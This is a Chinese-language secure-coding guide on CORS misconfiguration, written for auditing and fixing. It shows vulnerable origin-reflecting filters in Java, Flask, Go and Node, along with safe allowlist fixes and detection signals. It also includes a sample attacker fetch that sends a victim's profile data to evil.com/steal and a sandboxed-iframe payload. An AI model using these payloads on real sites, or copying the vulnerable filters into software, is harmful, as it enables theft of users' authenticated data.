# CORS 错误配置（CORS Misconfiguration）

## 漏洞模式

CORS（Cross-Origin Resource Sharing）配置错误允许攻击者从恶意站点发起跨域请求，读取受害者在目标站点上的数据。最危险的组合是 `Access-Control-Allow-Origin` 过宽 + `Access-Control-Allow-Credentials: true`，这使攻击者可以跨域读取受害者的已认证数据。

**核心原则：`Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` 不被浏览器允许（浏览器会阻止），但反射 Origin 值 + Credentials 是等效的危险配置且会生效。**

## 危险配置模式

### 模式 1：反射 Origin（最危险）

```java
// ❌ 将请求的 Origin 直接反射到响应头
@Override
public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
    HttpServletRequest request = (HttpServletRequest) req;
    HttpServletResponse response = (HttpServletResponse) res;
    
    String origin = request.getHeader("Origin");
    response.setHeader("Access-Control-Allow-Origin", origin); // 反射任意 origin
    response.setHeader("Access-Control-Allow-Credentials", "true"); // 允许携带 cookie
    chain.doFilter(req, res);
}
```

```python
# ❌ Flask 反射 Origin
@app.after_request
def add_cors(response):
    origin = request.headers.get('Origin', '')
    response.headers['Access-Control-Allow-Origin'] = origin  # 反射
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

```go
// ❌ Go 反射 Origin
func corsMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")
        w.Header().Set("Access-Control-Allow-Origin", origin)
        w.Header().Set("Access-Control-Allow-Credentials", "true")
        next.ServeHTTP(w, r)
    })
}
```

攻击方式：

```javascript
// 攻击者页面 (evil.com)
fetch('https://target.com/api/user/profile', {
    credentials: 'include', // 携带受害者的 cookie
})
.then(r => r.json())
.then(data => {
    // data 包含受害者的个人信息
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data),
    });
});
```

### 模式 2：null Origin

```java
// ❌ 允许 null origin
response.setHeader("Access-Control-Allow-Origin", "null");
response.setHeader("Access-Control-Allow-Credentials", "true");
```

攻击方式：`null` Origin 可通过 iframe sandboxing 触发：

```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://target.com/api/sensitive', {credentials: 'include'})
    .then(r => r.json())
    .then(d => parent.postMessage(d, '*'));
  </script>
"></iframe>
```

### 模式 3：正则校验不严格

```javascript
// ❌ 使用 endsWith 校验（可被绕过）
const origin = req.headers.origin;
if (origin.endsWith('.trusted.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}
// 攻击者注册 evil-trusted.com → 通过校验

// ❌ 使用 includes 校验
if (origin.includes('trusted.com')) {
    // trusted.com.evil.com 也通过
}
```

```javascript
// ✅ 使用白名单精确匹配
const allowedOrigins = ['https://app.trusted.com', 'https://admin.trusted.com'];
const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

### 模式 4：通配符 + 敏感 API

```
❌ 
Access-Control-Allow-Origin: *

不能同时设 Credentials: true（浏览器会拒绝），
但如果 API 不需要 cookie（使用 token 认证且 token 在 header 中），
通配符允许任何站点读取 API 响应内容。

如果 API 返回的是公开数据（天气/汇率），通配符可接受。
如果 API 返回用户特定数据（即使通过 header token 认证），通配符仍是风险。
```

## 安全配置对比

| 场景 | 错误配置 | 正确配置 |
|------|---------|---------|
| 需要跨域 + 携带 cookie | 反射 Origin + Credentials: true | 白名单精确匹配 + Credentials: true |
| 公开 API（无认证） | `*`（可接受） | `*`（可接受，但确认数据确实公开） |
| 同组织跨域 | `.endsWith('.company.com')` | 精确白名单 `['https://app.company.com', ...]` |
| 不需要跨域 | 任何 CORS 头 | 不设置任何 CORS 头 |

## 识别信号

| 信号 | 说明 |
|------|------|
| `request.getHeader("Origin")` 的值直接写入响应头 | 反射 Origin |
| `Access-Control-Allow-Origin` 和 `Access-Control-Allow-Credentials` 同时设置 | 高风险组合 |
| Origin 校验使用 `indexOf` / `includes` / `endsWith` | 可被子域名绕过 |
| `Access-Control-Allow-Origin: null` | 可通过 sandboxed iframe 利用 |
| 框架 CORS 配置中 origin 设为 `*` 或 `true` | 过宽的 CORS 策略 |

## 审计方法

1. **搜索 CORS 设置**：`rg "Access-Control-Allow|cors|CORS|CrossOrigin|@CrossOrigin"` 在配置文件和源码中
2. **检查 Origin 来源**：响应头中的 Origin 值是否来自请求头（反射）？
3. **检查校验逻辑**：如果有 Origin 校验，是精确匹配还是模糊匹配？
4. **检查 Credentials**：是否同时设置了 `Allow-Credentials: true`？如果是，`Allow-Origin` 绝不能为 `*` 或反射任意值
5. **评估 API 敏感性**：CORS 策略覆盖的 API 是否返回用户特定数据？
